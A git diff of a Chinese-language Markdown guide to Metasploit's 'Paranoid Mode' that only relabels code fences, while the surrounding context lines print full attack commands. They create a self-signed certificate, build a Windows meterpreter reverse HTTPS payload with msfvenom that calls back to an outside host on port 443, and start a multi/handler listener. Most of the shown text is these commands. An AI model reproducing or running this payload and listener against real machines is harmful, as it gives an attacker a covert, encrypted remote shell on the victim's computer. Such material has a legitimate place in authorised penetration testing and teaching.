@@ -14,7 +14,7 @@ rapid7官方将之称为```Paranoid Mode(偏执模式)```，相关wiki：[github
 
 # 创建证书
 
-```shell script
+```shell
 openssl req -new -newkey rsa:4096 -days 36500 -nodes -x509 -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" -keyout cert.key -out cert.crt
 cat cert.key  cert.crt > cert.pem
 rm -f cert.key  cert.crt
@@ -24,7 +24,7 @@ rm -f cert.key  cert.crt
 
 # 生成payload
 
-```shell script
+```shell
 msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./cert.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f exe -o ./launch-paranoid.exe
 ```
 
@@ -44,7 +44,7 @@ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443
 
 # 设置监听
 
-```shell script
+```shell
 msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_winhttps
